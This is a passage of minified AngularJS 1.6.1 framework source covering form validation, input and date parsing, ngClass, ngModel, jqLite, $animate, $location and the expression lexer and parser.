void 0,d(this,"",null)):(b(this,"ng-pending",!1),this.$valid=Wd(this.$error),this.$invalid=!this.$valid,d(this,"",this.$valid));g=this.$pending&&this.$pending[a]?void 0:this.$error[a]?!1:this.$$success[a]?!0:null;d(this,a,g);this.$$parentForm.$setValidity(a,g,this)}}function Wd(a){if(a)for(var b in a)if(a.hasOwnProperty(b))return!1;return!0}function xc(a){a.$formatters.push(function(b){return a.$isEmpty(b)?b:b.toString()})}function Sa(a,b,d,c,f,e){var g=P(b[0].type);if(!f.android){var h=!1;b.on("compositionstart",
function(){h=!0});b.on("compositionend",function(){h=!1;l()})}var k,l=function(a){k&&(e.defer.cancel(k),k=null);if(!h){var f=b.val();a=a&&a.type;"password"===g||d.ngTrim&&"false"===d.ngTrim||(f=S(f));(c.$viewValue!==f||""===f&&c.$$hasNativeValidators)&&c.$setViewValue(f,a)}};if(f.hasEvent("input"))b.on("input",l);else{var m=function(a,b,c){k||(k=e.defer(function(){k=null;b&&b.value===c||l(a)}))};b.on("keydown",function(a){var b=a.keyCode;91===b||15<b&&19>b||37<=b&&40>=b||m(a,this,this.value)});if(f.hasEvent("paste"))b.on("paste cut",
m)}b.on("change",l);if(Xd[g]&&c.$$hasNativeValidators&&g===d.type)b.on("keydown wheel mousedown",function(a){if(!k){var b=this.validity,c=b.badInput,d=b.typeMismatch;k=e.defer(function(){k=null;b.badInput===c&&b.typeMismatch===d||l(a)})}});c.$render=function(){var a=c.$isEmpty(c.$viewValue)?"":c.$viewValue;b.val()!==a&&b.val(a)}}function Nb(a,b){return function(d,c){var f,e;if(fa(d))return d;if(E(d)){'"'===d.charAt(0)&&'"'===d.charAt(d.length-1)&&(d=d.substring(1,d.length-1));if(Kg.test(d))return new Date(d);
a.lastIndex=0;if(f=a.exec(d))return f.shift(),e=c?{yyyy:c.getFullYear(),MM:c.getMonth()+1,dd:c.getDate(),HH:c.getHours(),mm:c.getMinutes(),ss:c.getSeconds(),sss:c.getMilliseconds()/1E3}:{yyyy:1970,MM:1,dd:1,HH:0,mm:0,ss:0,sss:0},q(f,function(a,c){c<b.length&&(e[b[c]]=+a)}),new Date(e.yyyy,e.MM-1,e.dd,e.HH,e.mm,e.ss||0,1E3*e.sss||0)}return NaN}}function pb(a,b,d,c){return function(f,e,g,h,k,l,m){function n(a){return a&&!(a.getTime&&a.getTime()!==a.getTime())}function p(a){return v(a)&&!fa(a)?d(a)||
void 0:a}yc(f,e,g,h);Sa(f,e,g,h,k,l);var r=h&&h.$options.getOption("timezone"),q;h.$$parserName=a;h.$parsers.push(function(a){if(h.$isEmpty(a))return null;if(b.test(a))return a=d(a,q),r&&(a=Wb(a,r)),a});h.$formatters.push(function(a){if(a&&!fa(a))throw qb("datefmt",a);if(n(a))return(q=a)&&r&&(q=Wb(q,r,!0)),m("date")(a,c,r);q=null;return""});if(v(g.min)||g.ngMin){var s;h.$validators.min=function(a){return!n(a)||x(s)||d(a)>=s};g.$observe("min",function(a){s=p(a);h.$validate()})}if(v(g.max)||g.ngMax){var u;
h.$validators.max=function(a){return!n(a)||x(u)||d(a)<=u};g.$observe("max",function(a){u=p(a);h.$validate()})}}}function yc(a,b,d,c){(c.$$hasNativeValidators=F(b[0].validity))&&c.$parsers.push(function(a){var c=b.prop("validity")||{};return c.badInput||c.typeMismatch?void 0:a})}function Yd(a){a.$$parserName="number";a.$parsers.push(function(b){if(a.$isEmpty(b))return null;if(Lg.test(b))return parseFloat(b)});a.$formatters.push(function(b){if(!a.$isEmpty(b)){if(!Y(b))throw qb("numfmt",b);b=b.toString()}return b})}
function Ta(a){v(a)&&!Y(a)&&(a=parseFloat(a));return ga(a)?void 0:a}function zc(a){var b=a.toString(),d=b.indexOf(".");return-1===d?-1<a&&1>a&&(a=/e-(\d+)$/.exec(b))?Number(a[1]):0:b.length-d-1}function Zd(a,b,d){a=Number(a);if((a|0)!==a||(b|0)!==b||(d|0)!==d){var c=Math.max(zc(a),zc(b),zc(d)),c=Math.pow(10,c);a*=c;b*=c;d*=c}return 0===(a-b)%d}function $d(a,b,d,c,f){if(v(c)){a=a(c);if(!a.constant)throw qb("constexpr",d,c);return a(b)}return f}function Ac(a,b){function d(a,b){if(!a||!a.length)return[];
if(!b||!b.length)return a;var c=[],d=0;a:for(;d<a.length;d++){for(var e=a[d],f=0;f<b.length;f++)if(e===b[f])continue a;c.push(e)}return c}function c(a){var b=a;C(a)?b=a.map(c).join(" "):F(a)&&(b=Object.keys(a).filter(function(b){return a[b]}).join(" "));return b}function f(a){var b=a;if(C(a))b=a.map(f);else if(F(a)){var c=!1,b=Object.keys(a).filter(function(b){b=a[b];!c&&x(b)&&(c=!0);return b});c&&b.push(void 0)}return b}a="ngClass"+a;var e;return["$parse",function(g){return{restrict:"AC",link:function(h,
k,l){function m(a,b){var c=[];q(a,function(a){if(0<b||H[a])H[a]=(H[a]||0)+b,H[a]===+(0<b)&&c.push(a)});return c.join(" ")}function n(a){if(a===b){var c=t,c=m(c&&c.split(" "),1);l.$addClass(c)}else c=t,c=m(c&&c.split(" "),-1),l.$removeClass(c);w=a}function p(a){a=c(a);a!==t&&r(a)}function r(a){if(w===b){var c=t&&t.split(" "),e=a&&a.split(" "),f=d(c,e),c=d(e,c),f=m(f,-1),c=m(c,1);l.$addClass(c);l.$removeClass(f)}t=a}var s=l[a].trim(),v=":"===s.charAt(0)&&":"===s.charAt(1),s=g(s,v?f:c),u=v?p:r,H=k.data("$classCounts"),
w=!0,t;H||(H=W(),k.data("$classCounts",H));"ngClass"!==a&&(e||(e=g("$index",function(a){return a&1})),h.$watch(e,n));h.$watch(s,u,v)}}}]}function Ob(a,b,d,c,f,e,g,h,k){this.$modelValue=this.$viewValue=Number.NaN;this.$$rawModelValue=void 0;this.$validators={};this.$asyncValidators={};this.$parsers=[];this.$formatters=[];this.$viewChangeListeners=[];this.$untouched=!0;this.$touched=!1;this.$pristine=!0;this.$dirty=!1;this.$valid=!0;this.$invalid=!1;this.$error={};this.$$success={};this.$pending=void 0;
this.$name=k(d.name||"",!1)(a);this.$$parentForm=Mb;this.$options=Pb;this.$$parsedNgModel=f(d.ngModel);this.$$parsedNgModelAssign=this.$$parsedNgModel.assign;this.$$ngModelGet=this.$$parsedNgModel;this.$$ngModelSet=this.$$parsedNgModelAssign;this.$$pendingDebounce=null;this.$$parserValid=void 0;this.$$currentValidationRunId=0;this.$$scope=a;this.$$attr=d;this.$$element=c;this.$$animate=e;this.$$timeout=g;this.$$parse=f;this.$$q=h;this.$$exceptionHandler=b;Td(this);Mg(this)}function Mg(a){a.$$scope.$watch(function(){var b=
a.$$ngModelGet(a.$$scope);if(b!==a.$modelValue&&(a.$modelValue===a.$modelValue||b===b)){a.$modelValue=a.$$rawModelValue=b;a.$$parserValid=void 0;for(var d=a.$formatters,c=d.length,f=b;c--;)f=d[c](f);a.$viewValue!==f&&(a.$$updateEmptyClasses(f),a.$viewValue=a.$$lastCommittedViewValue=f,a.$render(),a.$$runValidators(a.$modelValue,a.$viewValue,w))}return b})}function Bc(a){this.$$options=a}function ae(a,b){q(b,function(b,c){v(a[c])||(a[c]=b)})}var Ng=/^\/(.+)\/([a-z]*)$/,va=Object.prototype.hasOwnProperty,
P=function(a){return E(a)?a.toLowerCase():a},vb=function(a){return E(a)?a.toUpperCase():a},La,D,oa,wa=[].slice,ng=[].splice,Og=[].push,na=Object.prototype.toString,Gc=Object.getPrototypeOf,Ga=M("ng"),$=z.angular||(z.angular={}),Zb,rb=0;La=z.document.documentMode;var ga=Number.isNaN||function(a){return a!==a};w.$inject=[];Ya.$inject=[];var C=Array.isArray,le=/^\[object (?:Uint8|Uint8Clamped|Uint16|Uint32|Int8|Int16|Int32|Float32|Float64)Array]$/,S=function(a){return E(a)?a.trim():a},Gd=function(a){return a.replace(/([-()[\]{}+?*.$^|,:#<!\\])/g,
"\\$1").replace(/\x08/g,"\\x08")},za=function(){if(!v(za.rules)){var a=z.document.querySelector("[ng-csp]")||z.document.querySelector("[data-ng-csp]");if(a){var b=a.getAttribute("ng-csp")||a.getAttribute("data-ng-csp");za.rules={noUnsafeEval:!b||-1!==b.indexOf("no-unsafe-eval"),noInlineStyle:!b||-1!==b.indexOf("no-inline-style")}}else{a=za;try{new Function(""),b=!1}catch(d){b=!0}a.rules={noUnsafeEval:b,noInlineStyle:!1}}}return za.rules},sb=function(){if(v(sb.name_))return sb.name_;var a,b,d=Ka.length,
c,f;for(b=0;b<d;++b)if(c=Ka[b],a=z.document.querySelector("["+c.replace(":","\\:")+"jq]")){f=a.getAttribute(c+"jq");break}return sb.name_=f},ne=/:/g,Ka=["ng-","data-ng-","ng:","x-ng-"],qe=function(a){if(!a.currentScript)return!0;var b=a.currentScript.getAttribute("src"),d=a.createElement("a");d.href=b;if(a.location.origin===d.origin)return!0;switch(d.protocol){case "http:":case "https:":case "ftp:":case "blob:":case "file:":case "data:":return!0;default:return!1}}(z.document),te=/[A-Z]/g,Oc=!1,Ja=
3,ye={full:"1.6.1",major:1,minor:6,dot:1,codeName:"promise-rectification"};X.expando="ng339";var ib=X.cache={},$f=1;X._data=function(a){return this.cache[a[this.expando]]||{}};var Wf=/-([a-z])/g,Pg=/^-ms-/,Ab={mouseleave:"mouseout",mouseenter:"mouseover"},ac=M("jqLite"),Zf=/^<([\w-]+)\s*\/?>(?:<\/\1>|)$/,$b=/<|&#?\w+;/,Xf=/<([\w:-]+)/,Yf=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:-]+)[^>]*)\/>/gi,ha={option:[1,'<select multiple="multiple">',"</select>"],thead:[1,"<table>","</table>"],
col:[2,"<table><colgroup>","</colgroup></table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],_default:[0,"",""]};ha.optgroup=ha.option;ha.tbody=ha.tfoot=ha.colgroup=ha.caption=ha.thead;ha.th=ha.td;var eg=z.Node.prototype.contains||function(a){return!!(this.compareDocumentPosition(a)&16)},Oa=X.prototype={ready:$c,toString:function(){var a=[];q(this,function(b){a.push(""+b)});return"["+a.join(", ")+"]"},eq:function(a){return 0<=a?D(this[a]):D(this[this.length+
a])},length:0,push:Og,sort:[].sort,splice:[].splice},Gb={};q("multiple selected checked disabled readOnly required open".split(" "),function(a){Gb[P(a)]=a});var ed={};q("input select option textarea button form details".split(" "),function(a){ed[a]=!0});var ld={ngMinlength:"minlength",ngMaxlength:"maxlength",ngMin:"min",ngMax:"max",ngPattern:"pattern",ngStep:"step"};q({data:dc,removeData:hb,hasData:function(a){for(var b in ib[a.ng339])return!0;return!1},cleanData:function(a){for(var b=0,d=a.length;b<
d;b++)hb(a[b])}},function(a,b){X[b]=a});q({data:dc,inheritedData:Eb,scope:function(a){return D.data(a,"$scope")||Eb(a.parentNode||a,["$isolateScope","$scope"])},isolateScope:function(a){return D.data(a,"$isolateScope")||D.data(a,"$isolateScopeNoTemplate")},controller:bd,injector:function(a){return Eb(a,"$injector")},removeAttr:function(a,b){a.removeAttribute(b)},hasClass:Bb,css:function(a,b,d){b=xb(b.replace(Pg,"ms-"));if(v(d))a.style[b]=d;else return a.style[b]},attr:function(a,b,d){var c=a.nodeType;
if(c!==Ja&&2!==c&&8!==c&&a.getAttribute){var c=P(b),f=Gb[c];if(v(d))null===d||!1===d&&f?a.removeAttribute(b):a.setAttribute(b,f?c:d);else return a=a.getAttribute(b),f&&null!==a&&(a=c),null===a?void 0:a}},prop:function(a,b,d){if(v(d))a[b]=d;else return a[b]},text:function(){function a(a,d){if(x(d)){var c=a.nodeType;return 1===c||c===Ja?a.textContent:""}a.textContent=d}a.$dv="";return a}(),val:function(a,b){if(x(b)){if(a.multiple&&"select"===xa(a)){var d=[];q(a.options,function(a){a.selected&&d.push(a.value||
a.text)});return d}return a.value}a.value=b},html:function(a,b){if(x(b))return a.innerHTML;yb(a,!0);a.innerHTML=b},empty:cd},function(a,b){X.prototype[b]=function(b,c){var f,e,g=this.length;if(a!==cd&&x(2===a.length&&a!==Bb&&a!==bd?b:c)){if(F(b)){for(f=0;f<g;f++)if(a===dc)a(this[f],b);else for(e in b)a(this[f],e,b[e]);return this}f=a.$dv;g=x(f)?Math.min(g,1):g;for(e=0;e<g;e++){var h=a(this[e],b,c);f=f?f+h:h}return f}for(f=0;f<g;f++)a(this[f],b,c);return this}});q({removeData:hb,on:function(a,b,d,
c){if(v(c))throw ac("onargs");if(Yc(a)){c=zb(a,!0);var f=c.events,e=c.handle;e||(e=c.handle=bg(a,f));c=0<=b.indexOf(" ")?b.split(" "):[b];for(var g=c.length,h=function(b,c,g){var h=f[b];h||(h=f[b]=[],h.specialHandlerWrapper=c,"$destroy"===b||g||a.addEventListener(b,e));h.push(d)};g--;)b=c[g],Ab[b]?(h(Ab[b],dg),h(b,void 0,!0)):h(b)}},off:ad,one:function(a,b,d){a=D(a);a.on(b,function f(){a.off(b,d);a.off(b,f)});a.on(b,d)},replaceWith:function(a,b){var d,c=a.parentNode;yb(a);q(new X(b),function(b){d?
c.insertBefore(b,d.nextSibling):c.replaceChild(b,a);d=b})},children:function(a){var b=[];q(a.childNodes,function(a){1===a.nodeType&&b.push(a)});return b},contents:function(a){return a.contentDocument||a.childNodes||[]},append:function(a,b){var d=a.nodeType;if(1===d||11===d){b=new X(b);for(var d=0,c=b.length;d<c;d++)a.appendChild(b[d])}},prepend:function(a,b){if(1===a.nodeType){var d=a.firstChild;q(new X(b),function(b){a.insertBefore(b,d)})}},wrap:function(a,b){var d=D(b).eq(0).clone()[0],c=a.parentNode;
c&&c.replaceChild(d,a);d.appendChild(a)},remove:Fb,detach:function(a){Fb(a,!0)},after:function(a,b){var d=a,c=a.parentNode;if(c){b=new X(b);for(var f=0,e=b.length;f<e;f++){var g=b[f];c.insertBefore(g,d.nextSibling);d=g}}},addClass:Db,removeClass:Cb,toggleClass:function(a,b,d){b&&q(b.split(" "),function(b){var f=d;x(f)&&(f=!Bb(a,b));(f?Db:Cb)(a,b)})},parent:function(a){return(a=a.parentNode)&&11!==a.nodeType?a:null},next:function(a){return a.nextElementSibling},find:function(a,b){return a.getElementsByTagName?
a.getElementsByTagName(b):[]},clone:cc,triggerHandler:function(a,b,d){var c,f,e=b.type||b,g=zb(a);if(g=(g=g&&g.events)&&g[e])c={preventDefault:function(){this.defaultPrevented=!0},isDefaultPrevented:function(){return!0===this.defaultPrevented},stopImmediatePropagation:function(){this.immediatePropagationStopped=!0},isImmediatePropagationStopped:function(){return!0===this.immediatePropagationStopped},stopPropagation:w,type:e,target:a},b.type&&(c=R(c,b)),b=ra(g),f=d?[c].concat(d):[c],q(b,function(b){c.isImmediatePropagationStopped()||
b.apply(a,f)})}},function(a,b){X.prototype[b]=function(b,c,f){for(var e,g=0,h=this.length;g<h;g++)x(e)?(e=a(this[g],b,c,f),v(e)&&(e=D(e))):bc(e,a(this[g],b,c,f));return v(e)?e:this}});X.prototype.bind=X.prototype.on;X.prototype.unbind=X.prototype.off;Qa.prototype={put:function(a,b){this[la(a,this.nextUid)]=b},get:function(a){return this[la(a,this.nextUid)]},remove:function(a){var b=this[a=la(a,this.nextUid)];delete this[a];return b}};var Uf=[function(){this.$get=[function(){return Qa}]}],gg=/^([^(]+?)=>/,
hg=/^[^(]*\(\s*([^)]*)\)/m,Qg=/,/,Rg=/^\s*(_?)(\S+?)\1\s*$/,fg=/((\/\/.*$)|(\/\*[\s\S]*?\*\/))/mg,da=M("$injector");eb.$$annotate=function(a,b,d){var c;if("function"===typeof a){if(!(c=a.$inject)){c=[];if(a.length){if(b)throw E(d)&&d||(d=a.name||ig(a)),da("strictdi",d);b=fd(a);q(b[1].split(Qg),function(a){a.replace(Rg,function(a,b,d){c.push(d)})})}a.$inject=c}}else C(a)?(b=a.length-1,tb(a[b],"fn"),c=a.slice(0,b)):tb(a,"fn",!0);return c};var be=M("$animate"),lf=function(){this.$get=w},mf=function(){var a=
new Qa,b=[];this.$get=["$$AnimateRunner","$rootScope",function(d,c){function f(a,b,c){var d=!1;b&&(b=E(b)?b.split(" "):C(b)?b:[],q(b,function(b){b&&(d=!0,a[b]=c)}));return d}function e(){q(b,function(b){var c=a.get(b);if(c){var d=jg(b.attr("class")),e="",f="";q(c,function(a,b){a!==!!d[b]&&(a?e+=(e.length?" ":"")+b:f+=(f.length?" ":"")+b)});q(b,function(a){e&&Db(a,e);f&&Cb(a,f)});a.remove(b)}});b.length=0}return{enabled:w,on:w,off:w,pin:w,push:function(g,h,k,l){l&&l();k=k||{};k.from&&g.css(k.from);
k.to&&g.css(k.to);if(k.addClass||k.removeClass)if(h=k.addClass,l=k.removeClass,k=a.get(g)||{},h=f(k,h,!0),l=f(k,l,!1),h||l)a.put(g,k),b.push(g),1===b.length&&c.$$postDigest(e);g=new d;g.complete();return g}}}]},jf=["$provide",function(a){var b=this;this.$$registeredAnimations=Object.create(null);this.register=function(d,c){if(d&&"."!==d.charAt(0))throw be("notcsel",d);var f=d+"-animation";b.$$registeredAnimations[d.substr(1)]=f;a.factory(f,c)};this.classNameFilter=function(a){if(1===arguments.length&&
(this.$$classNameFilter=a instanceof RegExp?a:null)&&/(\s+|\/)ng-animate(\s+|\/)/.test(this.$$classNameFilter.toString()))throw be("nongcls","ng-animate");return this.$$classNameFilter};this.$get=["$$animateQueue",function(a){function b(a,c,d){if(d){var h;a:{for(h=0;h<d.length;h++){var k=d[h];if(1===k.nodeType){h=k;break a}}h=void 0}!h||h.parentNode||h.previousElementSibling||(d=null)}d?d.after(a):c.prepend(a)}return{on:a.on,off:a.off,pin:a.pin,enabled:a.enabled,cancel:function(a){a.end&&a.end()},
enter:function(f,e,g,h){e=e&&D(e);g=g&&D(g);e=e||g.parent();b(f,e,g);return a.push(f,"enter",Aa(h))},move:function(f,e,g,h){e=e&&D(e);g=g&&D(g);e=e||g.parent();b(f,e,g);return a.push(f,"move",Aa(h))},leave:function(b,c){return a.push(b,"leave",Aa(c),function(){b.remove()})},addClass:function(b,c,g){g=Aa(g);g.addClass=jb(g.addclass,c);return a.push(b,"addClass",g)},removeClass:function(b,c,g){g=Aa(g);g.removeClass=jb(g.removeClass,c);return a.push(b,"removeClass",g)},setClass:function(b,c,g,h){h=Aa(h);
h.addClass=jb(h.addClass,c);h.removeClass=jb(h.removeClass,g);return a.push(b,"setClass",h)},animate:function(b,c,g,h,k){k=Aa(k);k.from=k.from?R(k.from,c):c;k.to=k.to?R(k.to,g):g;k.tempClasses=jb(k.tempClasses,h||"ng-inline-animate");return a.push(b,"animate",k)}}}]}],of=function(){this.$get=["$$rAF",function(a){function b(b){d.push(b);1<d.length||a(function(){for(var a=0;a<d.length;a++)d[a]();d=[]})}var d=[];return function(){var a=!1;b(function(){a=!0});return function(d){a?d():b(d)}}}]},nf=function(){this.$get=
["$q","$sniffer","$$animateAsyncRun","$$isDocumentHidden","$timeout",function(a,b,d,c,f){function e(a){this.setHost(a);var b=d();this._doneCallbacks=[];this._tick=function(a){c()?f(a,0,!1):b(a)};this._state=0}e.chain=function(a,b){function c(){if(d===a.length)b(!0);else a[d](function(a){!1===a?b(!1):(d++,c())})}var d=0;c()};e.all=function(a,b){function c(f){e=e&&f;++d===a.length&&b(e)}var d=0,e=!0;q(a,function(a){a.done(c)})};e.prototype={setHost:function(a){this.host=a||{}},done:function(a){2===
this._state?a():this._doneCallbacks.push(a)},progress:w,getPromise:function(){if(!this.promise){var b=this;this.promise=a(function(a,c){b.done(function(b){!1===b?c():a()})})}return this.promise},then:function(a,b){return this.getPromise().then(a,b)},"catch":function(a){return this.getPromise()["catch"](a)},"finally":function(a){return this.getPromise()["finally"](a)},pause:function(){this.host.pause&&this.host.pause()},resume:function(){this.host.resume&&this.host.resume()},end:function(){this.host.end&&
this.host.end();this._resolve(!0)},cancel:function(){this.host.cancel&&this.host.cancel();this._resolve(!1)},complete:function(a){var b=this;0===b._state&&(b._state=1,b._tick(function(){b._resolve(a)}))},_resolve:function(a){2!==this._state&&(q(this._doneCallbacks,function(b){b(a)}),this._doneCallbacks.length=0,this._state=2)}};return e}]},kf=function(){this.$get=["$$rAF","$q","$$AnimateRunner",function(a,b,d){return function(b,f){function e(){a(function(){g.addClass&&(b.addClass(g.addClass),g.addClass=
null);g.removeClass&&(b.removeClass(g.removeClass),g.removeClass=null);g.to&&(b.css(g.to),g.to=null);h||k.complete();h=!0});return k}var g=f||{};g.$$prepared||(g=Fa(g));g.cleanupStyles&&(g.from=g.to=null);g.from&&(b.css(g.from),g.from=null);var h,k=new d;return{start:e,end:e}}}]},ea=M("$compile"),hc=new function(){};Qc.$inject=["$provide","$$sanitizeUriProvider"];Ib.prototype.isFirstChange=function(){return this.previousValue===hc};var gd=/^((?:x|data)[:\-_])/i,mg=/[:\-_]+(.)/g,nd=M("$controller"),
md=/^(\S+)(\s+as\s+([\w$]+))?$/,vf=function(){this.$get=["$document",function(a){return function(b){b?!b.nodeType&&b instanceof D&&(b=b[0]):b=a[0].body;return b.offsetWidth+1}}]},od="application/json",kc={"Content-Type":od+";charset=utf-8"},pg=/^\[|^\{(?!\{)/,qg={"[":/]$/,"{":/}$/},og=/^\)]\}',?\n/,td=M("$http"),Ea=$.$interpolateMinErr=M("$interpolate");Ea.throwNoconcat=function(a){throw Ea("noconcat",a);};Ea.interr=function(a,b){return Ea("interr",a,b.toString())};var Df=function(){this.$get=["$window",
function(a){function b(a){var b=function(a){b.data=a;b.called=!0};b.id=a;return b}var d=a.angular.callbacks,c={};return{createCallback:function(a){a="_"+(d.$$counter++).toString(36);var e="angular.callbacks."+a,g=b(a);c[e]=d[a]=g;return e},wasCalled:function(a){return c[a].called},getResponse:function(a){return c[a].data},removeCallback:function(a){delete d[c[a].id];delete c[a]}}}]},Sg=/^([^?#]*)(\?([^#]*))?(#(.*))?$/,sg={http:80,https:443,ftp:21},lb=M("$location"),tg=/^\s*[\\/]{2,}/,Tg={$$absUrl:"",
$$html5:!1,$$replace:!1,absUrl:Jb("$$absUrl"),url:function(a){if(x(a))return this.$$url;var b=Sg.exec(a);(b[1]||""===a)&&this.path(decodeURIComponent(b[1]));(b[2]||b[1]||""===a)&&this.search(b[3]||"");this.hash(b[5]||"");return this},protocol:Jb("$$protocol"),host:Jb("$$host"),port:Jb("$$port"),path:xd("$$path",function(a){a=null!==a?a.toString():"";return"/"===a.charAt(0)?a:"/"+a}),search:function(a,b){switch(arguments.length){case 0:return this.$$search;case 1:if(E(a)||Y(a))a=a.toString(),this.$$search=
Lc(a);else if(F(a))a=Fa(a,{}),q(a,function(b,c){null==b&&delete a[c]}),this.$$search=a;else throw lb("isrcharg");break;default:x(b)||null===b?delete this.$$search[a]:this.$$search[a]=b}this.$$compose();return this},hash:xd("$$hash",function(a){return null!==a?a.toString():""}),replace:function(){this.$$replace=!0;return this}};q([wd,oc,nc],function(a){a.prototype=Object.create(Tg);a.prototype.state=function(b){if(!arguments.length)return this.$$state;if(a!==nc||!this.$$html5)throw lb("nostate");this.$$state=
x(b)?null:b;return this}});var Ua=M("$parse"),wg={}.constructor.prototype.valueOf,Qb=W();q("+ - * / % === !== == != < > <= >= && || ! = |".split(" "),function(a){Qb[a]=!0});var Ug={n:"\n",f:"\f",r:"\r",t:"\t",v:"\v","'":"'",'"':'"'},qc=function(a){this.options=a};qc.prototype={constructor:qc,lex:function(a){this.text=a;this.index=0;for(this.tokens=[];this.index<this.text.length;)if(a=this.text.charAt(this.index),'"'===a||"'"===a)this.readString(a);else if(this.isNumber(a)||"."===a&&this.isNumber(this.peek()))this.readNumber();
else if(this.isIdentifierStart(this.peekMultichar()))this.readIdent();else if(this.is(a,"(){}[].,;:?"))this.tokens.push({index:this.index,text:a}),this.index++;else if(this.isWhitespace(a))this.index++;else{var b=a+this.peek(),d=b+this.peek(2),c=Qb[b],f=Qb[d];Qb[a]||c||f?(a=f?d:c?b:a,this.tokens.push({index:this.index,text:a,operator:!0}),this.index+=a.length):this.throwError("Unexpected next character ",this.index,this.index+1)}return this.tokens},is:function(a,b){return-1!==b.indexOf(a)},peek:function(a){a=
a||1;return this.index+a<this.text.length?this.text.charAt(this.index+a):!1},isNumber:function(a){return"0"<=a&&"9">=a&&"string"===typeof a},isWhitespace:function(a){return" "===a||"\r"===a||"\t"===a||"\n"===a||"\v"===a||"\u00a0"===a},isIdentifierStart:function(a){return this.options.isIdentifierStart?this.options.isIdentifierStart(a,this.codePointAt(a)):this.isValidIdentifierStart(a)},isValidIdentifierStart:function(a){return"a"<=a&&"z">=a||"A"<=a&&"Z">=a||"_"===a||"$"===a},isIdentifierContinue:function(a){return this.options.isIdentifierContinue?
this.options.isIdentifierContinue(a,this.codePointAt(a)):this.isValidIdentifierContinue(a)},isValidIdentifierContinue:function(a,b){return this.isValidIdentifierStart(a,b)||this.isNumber(a)},codePointAt:function(a){return 1===a.length?a.charCodeAt(0):(a.charCodeAt(0)<<10)+a.charCodeAt(1)-56613888},peekMultichar:function(){var a=this.text.charAt(this.index),b=this.peek();if(!b)return a;var d=a.charCodeAt(0),c=b.charCodeAt(0);return 55296<=d&&56319>=d&&56320<=c&&57343>=c?a+b:a},isExpOperator:function(a){return"-"===
a||"+"===a||this.isNumber(a)},throwError:function(a,b,d){d=d||this.index;b=v(b)?"s "+b+"-"+this.index+" ["+this.text.substring(b,d)+"]":" "+d;throw Ua("lexerr",a,b,this.text);},readNumber:function(){for(var a="",b=this.index;this.index<this.text.length;){var d=P(this.text.charAt(this.index));if("."===d||this.isNumber(d))a+=d;else{var c=this.peek();if("e"===d&&this.isExpOperator(c))a+=d;else if(this.isExpOperator(d)&&c&&this.isNumber(c)&&"e"===a.charAt(a.length-1))a+=d;else if(!this.isExpOperator(d)||
c&&this.isNumber(c)||"e"!==a.charAt(a.length-1))break;else this.throwError("Invalid exponent")}this.index++}this.tokens.push({index:b,text:a,constant:!0,value:Number(a)})},readIdent:function(){var a=this.index;for(this.index+=this.peekMultichar().length;this.index<this.text.length;){var b=this.peekMultichar();if(!this.isIdentifierContinue(b))break;this.index+=b.length}this.tokens.push({index:a,text:this.text.slice(a,this.index),identifier:!0})},readString:function(a){var b=this.index;this.index++;
for(var d="",c=a,f=!1;this.index<this.text.length;){var e=this.text.charAt(this.index),c=c+e;if(f)"u"===e?(f=this.text.substring(this.index+1,this.index+5),f.match(/[\da-f]{4}/i)||this.throwError("Invalid unicode escape [\\u"+f+"]"),this.index+=4,d+=String.fromCharCode(parseInt(f,16))):d+=Ug[e]||e,f=!1;else if("\\"===e)f=!0;else{if(e===a){this.index++;this.tokens.push({index:b,text:c,constant:!0,value:d});return}d+=e}this.index++}this.throwError("Unterminated quote",b)}};var s=function(a,b){this.lexer=
a;this.options=b};s.Program="Program";s.ExpressionStatement="ExpressionStatement";s.AssignmentExpression="AssignmentExpression";s.ConditionalExpression="ConditionalExpression";s.LogicalExpression="LogicalExpression";s.BinaryExpression="BinaryExpression";s.UnaryExpression="UnaryExpression";s.CallExpression="CallExpression";s.MemberExpression="MemberExpression";s.Identifier="Identifier";s.Literal="Literal";s.ArrayExpression="ArrayExpression";s.Property="Property";s.ObjectExpression="ObjectExpression";
s.ThisExpression="ThisExpression";s.LocalsExpression="LocalsExpression";s.NGValueParameter="NGValueParameter";s.prototype={ast:function(a){this.text=a;this.tokens=this.lexer.lex(a);a=this.program();0!==this.tokens.length&&this.throwError("is an unexpected token",this.tokens[0]);return a},program:function(){for(var a=[];;)if(0<this.tokens.length&&!this.peek("}",")",";","]")&&a.push(this.expressionStatement()),!this.expect(";"))return{type:s.Program,body:a}},expressionStatement:function(){return{type:s.ExpressionStatement,
expression:this.filterChain()}},filterChain:function(){for(var a=this.expression();this.expect("|");)a=this.filter(a);return a},expression:function(){return this.assignment()},assignment:function(){var a=this.ternary();if(this.expect("=")){if(!Ad(a))throw Ua("lval");a={type:s.AssignmentExpression,left:a,right:this.assignment(),operator:"="}}return a},ternary:function(){var a=this.logicalOR(),b,d;return this.expect("?")&&(b=this.expression(),this.consume(":"))?(d=this.expression(),{type:s.ConditionalExpression,
test:a,alternate:b,consequent:d}):a},logicalOR:function(){for(var a=this.logicalAND();this.expect("||");)a={type:s.LogicalExpression,operator:"||",left:a,right:this.logicalAND()};return a},logicalAND:function(){for(var a=this.equality();this.expect("&&");)a={type:s.LogicalExpression,operator:"&&",left:a,right:this.equality()};return a},equality:function(){for(var a=this.relational(),b;b=this.expect("==","!=","===","!==");)a={type:s.BinaryExpression,operator:b.text,left:a,right:this.relational()};
return a},relational:function(){for(var a=this.additive(),b;b=this.expect("<",">","<=",">=");)a={type:s.BinaryExpression,operator:b.text,left:a,right:this.additive()};return a},additive:function(){for(var a=this.multiplicative(),b;b=this.expect("+","-");)a={type:s.BinaryExpression,operator:b.text,left:a,right:this.multiplicative()};return a},multiplicative:function(){for(var a=this.unary(),b;b=this.expect("*","/","%");)a={type:s.BinaryExpression,operator:b.text,left:a,right:this.unary()};return a},
unary:function(){var a;return(a=this.expect("+","-","!"))?{type:s.UnaryExpression,operator:a.text,prefix:!0,argument:this.unary()}:this.primary()},primary:function(){var a;this.expect("(")?(a=this.filterChain(),this.consume(")")):this.expect("[")?a=this.arrayDeclaration():this.expect("{")?a=this.object():this.selfReferential.hasOwnProperty(this.peek().text)?a=Fa(this.selfReferential[this.consume().text]):this.options.literals.hasOwnProperty(this.peek().text)?a={type:s.Literal,value:this.options.literals[this.consume().text]}:
